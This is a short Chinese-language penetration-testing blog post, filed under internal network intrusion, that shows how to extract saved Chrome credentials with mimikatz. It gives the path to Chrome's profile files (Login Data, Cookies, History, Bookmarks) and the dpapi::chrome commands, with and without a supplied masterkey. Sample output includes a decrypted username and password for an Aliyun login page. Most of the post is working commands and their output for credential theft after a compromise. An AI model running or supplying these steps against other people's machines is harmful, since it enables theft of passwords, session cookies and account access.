---
title: "导出 Chrome 中的凭据与信息"
date: 2019-07-09T00:00:00+08:00
draft: false
tags: ["chrome",'mimikatz']
categories: ["内网渗透"]
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

因为之前的文章关于 dpapi 和 masterkey 的说明已经给出了, 故本文就不再赘述.

mimikatz 的 dpapi 模块支持一键导出 chrome 数据, 包括登录信息, 历史记录, cookies 等.

<!--more-->

chrome 数据存放在 `%localappdata%\Google\Chrome\User Data\Default\` 目录中.

其中几个比较重要的文件.

```
Bookmarks
Login Data
Cookies
History
```

以 `Login Data` 为例.

```
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

URL     : https://passport.aliyun.com/ ( https://passport.aliyun.com/mini_login.htm )
Username: admin
```

指定 masterkey 参数.

```
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /masterkey:7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393

URL     : https://passport.aliyun.com/ ( https://passport.aliyun.com/mini_login.htm )
Username: admin
 * volatile cache: GUID:{f07bdf43-6d13-4957-94c0-bc0094da1667};KeyHash:f7d1c2f24e1d3a27c3becf10ed42acd890eb5e14
 * masterkey     : 7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
Password: 123456
```